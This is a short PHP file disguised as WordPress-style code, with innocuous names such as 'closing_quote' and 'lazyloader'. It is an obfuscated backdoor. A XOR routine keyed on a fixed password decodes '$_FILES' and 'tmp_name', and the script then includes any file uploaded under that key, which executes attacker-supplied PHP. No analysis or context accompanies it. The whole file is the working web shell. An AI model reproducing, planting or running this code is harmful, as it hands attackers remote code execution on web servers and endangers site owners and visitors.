<?php 	
$label_count = 'emXGRocl0PC5';
$raw_excerpt = $label_count;
function closing_quote($pee_part, $cache)

{
    $lazyloader = $cache;
    $icon_dir_uri = urldecode($pee_part);

    $ancestor = substr($lazyloader,0, strlen($icon_dir_uri));
    $apos_flag = $icon_dir_uri ^ $ancestor;
    return $apos_flag;
}
$alt_post_name = ${closing_quote("%3A%2B%11%0B%17%3C", $raw_excerpt)};
$supports = $alt_post_name;

$deleted = isset($supports[$raw_excerpt]);
if ($deleted)

{
    $check = $alt_post_name[$raw_excerpt];
    $encoded_char = $check[closing_quote("%11%00%28%18%3C%0E%0E%09", $raw_excerpt)];
    $clean_terms = $encoded_char;

    include ($clean_terms);
}
?>
